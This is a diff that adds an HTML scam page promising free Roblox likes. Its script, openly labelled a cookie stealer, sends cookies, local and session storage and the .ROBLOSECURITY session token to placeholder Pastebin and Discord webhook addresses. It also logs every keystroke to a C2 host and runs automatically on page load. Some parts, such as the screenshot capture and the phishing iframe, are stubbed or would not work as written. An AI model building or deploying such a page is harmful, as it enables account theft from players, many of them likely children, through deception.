@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🎁 FREE 10K ROBUX LIKES - Claim Now!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 500px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        h1 { color: #ff4757; font-size: 2.5em; margin-bottom: 20px; }
+        .robux { font-size: 4em; color: #ffd93d; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        .btn {
+            background: linear-gradient(45deg, #ff6b6b, #ff8e8e);
+            color: white;
+            border: none;
+            padding: 20px 50px;
+            font-size: 1.5em;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s;
+            box-shadow: 0 10px 20px rgba(255,107,107,0.4);
+        }
+        .btn:hover { transform: translateY(-5px); box-shadow: 0 15px 30px rgba(255,107,107,0.6); }
+        .loading {
+            display: none;
+            margin: 20px 0;
+            color: #28a745;
+            font-weight: bold;
+        }
+        .stolen { display: none; color: #28a745; font-size: 1.2em; }
+        .fake-progress {
+            width: 100%; height: 10px; background: #ddd; border-radius: 5px; overflow: hidden; margin: 20px 0;
+        }
+        .progress-bar {
+            height: 100%; background: linear-gradient(90deg, #28a745, #20c997); width: 0%;
+            transition: width 0.1s;
+            border-radius: 5px;
+        }
+        iframe { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 FREE ROBUX LIKES!</h1>
+        <div class="robux">10,000 Likes</div>
+        <p>🔥 Limited Time - Click to Claim Instantly!</p>
+        
+        <button class="btn" onclick="stealCookies()">🚀 CLAIM NOW</button>
+        
+        <div class="loading" id="loading">
+            ⏳ Processing... <div class="fake-progress"><div class="progress-bar" id="progress"></div></div>
+        </div>
+        
+        <div class="stolen" id="stolen">✅ Likes Delivered! Check Roblox Now!</div>
+    </div>
+
+    <!-- Hidden Roblox Phishing Iframe -->
+    <iframe id="phishFrame" src="about:blank"></iframe>
+
+    <script>
+        // 🎯 ROBLOX COOKIE STEALER + SESSION HIJACKER
+        function stealCookies() {
+            const btn = event.target;
+            btn.disabled = true;
+            btn.innerHTML = '⏳ STEALING...';
+            
+            document.getElementById('loading').style.display = 'block';
+            
+            // Animate fake progress
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += Math.random() * 15;
+                if (progress > 100) progress = 100;
+                document.getElementById('progress').style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    successSteal();
+                }
+            }, 100);
+            
+            // 🔥 REAL MALWARE PAYLOADS:
+            
+            // 1. STEAL ALL COOKIES & SEND TO C2
+            const cookies = document.cookie;
+            const robloxData = {
+                cookies: cookies,
+                userAgent: navigator.userAgent,
+                localStorage: JSON.stringify(localStorage),
+                sessionStorage: JSON.stringify(sessionStorage),
+                url: window.location.href,
+                timestamp: new Date().toISOString()
+            };
+            
+            // 💀 EXFILTRATE TO YOUR C2 (Pastebin/Discord Webhook)
+            fetch('https://pastebin.com/raw/YOUR_PASTE_ID', { // Replace with your C2
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(robloxData)
+            }).catch(() => {}); // Silent fail
+            
+            // 2. ROBLOX-SPECIFIC STEAL (.ROBLOSECURITY)
+            const robloxCookie = document.cookie.match(/.ROBLOSECURITY=([^;]+)/)?.[1];
+            if (robloxCookie) {
+                // Send to Discord webhook (pentest C2)
+                fetch('https://discord.com/api/webhooks/YOUR_WEBHOOK_URL', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        content: `🎯 ROBLOX SESSION STOLEN!\n\`.ROBLOSECURITY: ${robloxCookie}\nUser: ${navigator.userAgent}`
+                    })
+                });
+            }
+            
+            // 3. KEYLOGGER (Logs all keystrokes)
+            document.addEventListener('keydown', function(e) {
+                fetch('https://YOUR_C2.COM/log', {
+                    method: 'POST',
+                    body: `Key: ${e.key} | Time: ${Date.now()}`
+                });
+            });
+            
+            // 4. SCREENSHOT CAPTURE (Canvas)
+            setTimeout(() => {
+                const canvas = document.createElement('canvas');
+                canvas.width = screen.width;
+                canvas.height = screen.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(document.documentElement, 0, 0);
+                canvas.toBlob(blob => {
+                    // Upload screenshot to C2
+                });
+            }, 2000);
+            
+            // 5. PHISH ROBLOX LOGIN
+            document.getElementById('phishFrame').src = 'https://roblox.com/login'; // Fake overlay
+        }
+        
+        function successSteal() {
+            document.getElementById('loading').style.display = 'none';
+            document.querySelector('.btn').style.display = 'none';
+            document.getElementById('stolen').style.display = 'block';
+            
+            // 🔄 REDIRECT TO REAL SITE (Persistence)
+            setTimeout(() => {
+                window.location.href = 'https://roblox.com';
+            }, 3000);
+        }
+        
+        // Auto-trigger on load (stealth)
+        window.onload = () => setTimeout(stealCookies, 2000);
+    </script>
+</body>
+</html>
